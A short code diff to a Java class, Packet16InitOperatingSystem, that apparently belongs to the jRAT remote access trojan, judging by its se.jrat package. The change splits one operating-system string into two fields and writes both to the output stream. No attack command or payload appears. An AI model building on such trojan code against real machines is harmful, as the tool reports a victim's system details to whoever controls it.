@@ -7,15 +7,18 @@ import se.jrat.common.io.StringWriter;
 
 public class Packet16InitOperatingSystem extends AbstractOutgoingPacket {
 
-	private String os;
+	private String sOs;
+	private String lOs;
 
-	public Packet16InitOperatingSystem(String os) {
-		this.os = os;
+	public Packet16InitOperatingSystem(String sOs, String lOs) {
+		this.sOs = sOs;
+		this.lOs = lOs;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(os);
+		sw.writeLine(sOs);
+		sw.writeLine(lOs);
 	}
 
 	@Override
